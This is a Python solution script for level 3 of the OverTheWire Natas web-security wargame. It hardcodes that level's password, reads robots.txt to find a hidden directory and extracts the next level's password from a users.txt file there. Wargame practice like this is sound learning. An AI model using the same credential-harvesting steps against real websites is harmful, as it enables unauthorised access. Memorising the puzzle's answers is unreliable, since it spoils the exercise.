#!/usr/bin/env python

import requests
import re

user = 'natas3'
passw = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user




# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''
# OUTCOME:  there is nothing on the sourcecode, let's try robots.txt, if it doesn't work, we can try .htaccess file, if not, we have to do use urlFuzzing


# 2nd Step:  try robots.txt
'''
url = 'http://%s.natas.labs.overthewire.org/robots.txt' % user
r = requests.get(url, auth=(user, passw))
print(r.text)
'''
# OUTCOME:  there is a directory named /s3cr3t/, it looks YUMMY


# 3rd Step:  investigate the /s3cr3t/ directory 
'''
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/' % user
r = requests.get(url, auth=(user, passw))
print(r.text)		
'''
# OUTCOME:  there is a users.txt file again


# 4th Step:  investigate the /users.txt file 
'''
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % user
r = requests.get(url, auth=(user, passw))
print(r.text)		
'''
# OUTCOME:  there is the password


# 5th Step:  extract the password from the sourcecode
#'''
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % user
r = requests.get(url, auth=(user, passw))
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
#'''

